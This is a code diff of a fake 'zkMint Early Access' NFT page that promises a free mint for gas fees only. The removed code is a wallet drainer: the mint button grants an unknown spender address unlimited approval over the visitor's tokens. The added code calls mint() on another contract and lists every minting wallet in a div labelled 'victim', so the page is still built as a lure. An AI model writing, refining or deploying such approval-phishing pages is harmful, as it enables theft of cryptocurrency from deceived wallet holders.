@@ -32,33 +32,59 @@
     #status {
       margin-top: 20px;
       color: lime;
+      white-space: pre-wrap;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      word-break: break-word;
     }
   </style>
 </head>
 <body>
   <h1>zkMint Early Access</h1>
   <p>Claim your free NFT before public launch. Gas fees only.</p>
-  <button onclick="approve()">Mint Now</button>
+  <button onclick="mint()">Mint Now</button>
   <div id="status"></div>
+  <div id="victim" style="margin-top:10px; color: orange; font-weight: bold;"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
   <script>
     const tokenAddress = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619";
-    const spenderAddress = "0x2114F30015F2Efae172F727239eD455B2c4ddA0A";
+    const contractAddress = "0x5Dafa64c0bC33EE4aA369020AD678BDEf6454E1c";
 
-    async function approve() {
-      const [signer] = await window.ethereum.request({ method: "eth_requestAccounts" });
+    const abi = [
+      "event Minted(address indexed user)",
+      "function mint() external"
+    ];
+
+    async function mint() {
       const provider = new ethers.BrowserProvider(window.ethereum);
-      const user = await provider.getSigner();
-      const token = new ethers.Contract(tokenAddress, [
-        "function approve(address spender, uint256 value) public returns (bool)"
-      ], user);
+      const signer = await provider.getSigner();
+      const contract = new ethers.Contract(contractAddress, abi, signer);
 
-      const tx = await token.approve(spenderAddress, ethers.MaxUint256);
-      document.getElementById("status").innerText = "🔄 Waiting for approval...";
-      await tx.wait();
-      document.getElementById("status").innerText = "✅ Approved. NFT will appear in your wallet soon!";
+      try {
+        const tx = await contract.mint();
+        document.getElementById("status").innerText = "🔄 Mint transaction sent. Waiting for confirmation...";
+        await tx.wait();
+        document.getElementById("status").innerText = "✅ Mint successful!";
+
+      } catch (err) {
+        document.getElementById("status").innerText = "❌ Mint failed: " + err.message;
+      }
     }
+
+    async function listenMintEvents() {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const contract = new ethers.Contract(contractAddress, abi, provider);
+
+      contract.on("Minted", (user) => {
+        console.log("Minted by:", user);
+        const victimDiv = document.getElementById("victim");
+        victimDiv.innerText += `New Mint by: ${user}\n`;
+      });
+    }
+
+    listenMintEvents();
   </script>
 </body>
 </html>
